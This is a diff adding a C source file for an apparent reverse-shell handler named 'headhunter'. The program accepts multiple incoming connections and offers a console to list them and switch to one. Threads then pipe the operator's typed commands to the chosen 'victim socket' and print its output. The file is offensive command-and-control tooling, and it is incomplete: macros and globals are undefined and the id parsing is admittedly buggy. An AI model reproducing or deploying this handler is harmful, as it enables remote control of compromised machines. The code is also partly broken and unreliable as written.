@@ -1,0 +1,182 @@
+#include <stdio.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <ctype.h>
+#include <string.h>
+#include <unistd.h>
+
+int server_control_session(){
+    int n;
+    char buffer[MAXBUF];
+    int selected_id;
+
+    printf(PROMPT);
+    fflush(NULL);
+    while((n = read(a.src, buffer, MAXBUF)) > 0){
+        if (strcmp(buffer, "help\n") == 0) {
+            printf("Showing all help commands:\n");
+            printf(">help                   |  List all available commands\n");
+            printf(">list connections       |  List active connections\n");
+            printf(">use <connection id>    |  Switch session to specified connection by id\n");
+            printf(">exit                   |  Close headhunter\n");
+            printf("***********************************************************************\n");
+        } else if (strcmp(buffer, "list connections\n") == 0) {
+            printf("Current connections:\nID  |  Address\n--------------\n");
+            for (int i = 0; i < max_clients; i++){
+                if (client_socket[i] == 0){ continue; }  // Continue just in case there is a random NULL socket
+                printf("%3d |  %s\n", i + 1, get_socket_addr(client_socket[i]));
+            }
+            printf("--------------\n");
+        } else if (str_starts_with(buffer, "use") == 1) {
+            selected_id = 0;
+
+            for (int c = 4; c < strlen(buffer); c++){
+                if (isdigit(buffer[c])) {
+                    selected_id += ((int) buffer[c] - 48) * (strlen(buffer) - 5);  // TODO FIX THIS MESS PLEASE
+                }
+            }
+            printf("Exiting server control session...\n");
+            printf("Entering control session with id '%d'...\n", selected_id);
+            if (selected_id >= MAX_CLIENTS || selected_id < 0) {
+                printf("Invalid id!\nBuffer received:\n");
+                printf("%s\n", buffer);
+                printf("END OF BUFFER\n");
+                continue;
+            }
+            selected_id += 3;
+
+            return selected_id;
+        } else if (strcmp(buffer, "exit\n") == 0){
+            printf("Exiting server control session...\n");
+            return -1;
+        } else if(strcmp(buffer, "\n") == 0){
+        } else {
+            printf("Unknown command. Enter 'help' for list of available commands.\n");
+        }
+        printf(PROMPT);
+        fflush(NULL);
+        for (int i = 0; i < MAXBUF; i++){ buffer[i] = '\0'; }  // Clear buffer
+    }
+    printf("The program is bad\n");
+    fflush(NULL); sync();
+    return -1;
+}
+
+void *Socket_Reader(){
+    // Intercept incoming data from the current victim socket
+    char buffer[MAXBUF];
+    int n;
+
+    n = read(a.dest, buffer, MAXBUF);
+    write(STDOUT_FILENO, buffer, n);
+    printf("%d>", a.dest);
+    fflush(NULL);
+    while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
+        sync();
+        if (write(STDOUT_FILENO, buffer, n) == -1)  // writes data from victim fd to stdout
+            printf("Error in function write()\n");
+        sync(); fflush(NULL);
+        printf("%d>", a.dest);
+        sync(); fflush(NULL);
+    }
+
+    if (n == -1)
+        printf("Error in function read()\n");
+
+    a.kill = 1;
+    return NULL;
+}
+
+// *****************************************************
+// *****************************************************
+// *****************************************************
+
+void *Socket_Writer()
+{
+    // Reads data from stdin and writes to socket
+    int n;
+    char buffer[MAXBUF];
+
+    while (a.kill == 0 && (n = read(a.src, buffer, MAXBUF - 1)) > 0) // reads from the stdin file descriptor and executes code if it's contents are above 0. a.src is passed the stdin fd on line 122
+    {
+        fflush(NULL);
+        if (strcmp(buffer, "!exit\n") == 0) {
+            printf("Exiting session...\n");
+            a.kill = 1;
+            return NULL;
+        } else {
+            sync();
+            write(a.dest, buffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 123
+            sync();
+        }
+    }
+
+    if (n == -1)
+        printf("Error in function thread read()\n");
+
+    a.kill = 1;
+    return NULL;
+}
+
+// *****************************************************
+// *****************************************************
+// *****************************************************
+
+// Declaration of a thread routine that will be called by pthread for reading from stdin on server and write to the victim file descriptor
+void *Acceptor(){
+    FD_SET(master_socket, &readfds);  // assigned master socket to the set
+    for (i = 0; i < max_clients; i++)  // sets array of socket fds to zero so not read
+        client_socket[i] = 0;
+
+    while(1){
+        FD_ZERO(&readfds);
+        FD_SET(master_socket, &readfds);
+        max_sd = master_socket;
+
+        // add child sockets to set
+        for ( i = 0 ; i < max_clients ; i++){
+            // socket descriptor
+            sd = client_socket[i];
+
+            // if valid socket descriptor then add to read list
+            if(sd > 0)
+                FD_SET( sd , &readfds);
+
+            // highest file descriptor number, need it for the select function
+            if(sd > max_sd)
+                max_sd = sd;
+        }
+
+        // wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
+        activity = select( max_sd + 1, &readfds, NULL, NULL, NULL);
+
+        if ((activity < 0) && (errno!=EINTR)) {}
+
+        if (FD_ISSET(master_socket, &readfds)) {
+
+            //wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
+            activity = select( max_sd + 1 , &readfds , NULL , NULL , NULL);
+
+            if ((activity < 0) && (errno!=EINTR)) {}
+
+            if (FD_ISSET(master_socket, &readfds)) {
+                if ((new_socket = accept(master_socket, (struct sockaddr *)&cli, &len))<0){
+                    perror("accept");
+                    exit(EXIT_FAILURE);
+                }
+                // add new socket to an array of sockets
+
+                for (i = 0; i < max_clients; i++) {
+                    // only if position is empty
+                    if( client_socket[i] == 0 ){
+                        client_socket[i] = new_socket;
+                        printf("Connection received with %s\n\n", get_socket_addr(new_socket));
+
+                        break;
+                    }
+                }
+            }
+        }
+    }
+}
